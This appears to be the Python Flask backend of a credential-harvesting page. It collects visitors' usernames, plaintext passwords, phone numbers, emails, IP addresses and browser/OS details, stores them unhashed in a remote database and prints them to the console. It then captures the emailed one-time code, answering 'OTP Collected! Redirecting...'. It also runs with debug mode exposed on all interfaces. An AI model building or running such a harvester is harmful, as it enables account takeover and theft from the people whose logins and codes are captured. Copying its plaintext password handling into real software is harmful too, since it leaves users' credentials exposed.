from flask import Flask, render_template, request, jsonify, session
import random
import smtplib
from email.mime.text import MIMEText
# import mysql.connector
import os
from dotenv import load_dotenv
import pymysql

app = Flask(__name__)

load_dotenv()

app.secret_key = os.getenv("SECRET_KEY")
EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")


timeout = 10
connection = pymysql.connect(
  charset="utf8mb4",
  connect_timeout=timeout,
  cursorclass=pymysql.cursors.DictCursor,
  db="defaultdb",
  host=os.getenv("HOST"),
  password=os.getenv("DATABASE_PASSWORD"),
  read_timeout=timeout,
  port=24232,
  user="avnadmin",
  write_timeout=timeout,
)

cursor = connection.cursor()

cursor.execute("""
    CREATE TABLE IF NOT EXISTS user_data (
        id INT AUTO_INCREMENT PRIMARY KEY,
        phone_number VARCHAR(20),
        email_id VARCHAR(100),
        username VARCHAR(50),
        password VARCHAR(100),
        otp VARCHAR(10),
        ip_address VARCHAR(50),
        os_info TEXT,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )

""")
connection.commit()

def send_email_otp(email, otp):
    msg = MIMEText(f"Your OTP for login is: {otp}")
    msg["Subject"] = "Your OTP Code"
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = email

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, email, msg.as_string())
        server.quit()
        print("OTP Sent Successfully to Email!")
    except Exception as e:
        print("Error sending OTP via Email:", e)

# otp_generated = str(random.randint(100000,999999))
@app.route("/submit", methods=['POST'])
def submit():
    user_ip = request.remote_addr
    phone_number = request.form.get("phone_number")
    email_id = request.form.get("email_id")
    username = request.form.get("username")
    password = request.form.get("password")
    browser_os_info = request.form.get("browser_os_info")
    print(f"Received: {phone_number}, {email_id}, {username}, {password}, {user_ip}, {browser_os_info}") 

    otp_generated = str(random.randint(100000,999999))

    # Store OTP in session for verification
    session["otp"] = otp_generated
    session["email_id"] = email_id
    send_email_otp(email_id, otp_generated)

    sql = "INSERT INTO user_data (phone_number, email_id, username, password, ip_address, os_info) VALUES (%s, %s, %s, %s, %s, %s)"
    values = (phone_number, email_id, username, password, user_ip, browser_os_info)

    cursor.execute(sql,values)
    connection.commit()

    return jsonify({"message": "OTP Sent on your Email account!", "ip": user_ip})

@app.route("/submit-otp", methods=['POST'])
def submit_otp():
    otp_entered = request.form.get("otp")
    email_id = session.get("email_id")

    if not email_id:
        return jsonify({"message": "Session Expired! Please Try Again."})

    otp_stored = session.get("otp")

    if otp_stored and otp_entered == otp_stored:
        print(f"OTP Entered: {otp_entered}")

        sql = "UPDATE user_data SET otp = %s WHERE email_id = %s ORDER BY id DESC LIMIT 1"
        cursor.execute(sql, (otp_entered, email_id))
        connection.commit()

        session.pop("otp", None)
        session.pop("email_id", None)

        return jsonify({"message": "OTP Collected! Redirecting..."})

    else: 
        return jsonify({"message": "Incorrect OTP Entered! Try Again."})

@ app.route("/allow")
def allow():
    return render_template("allow.html")

@app.route("/")
def login():
    return render_template("login.html")

if __name__ == "__main__":
    app.run(host='0.0.0.0',debug=True)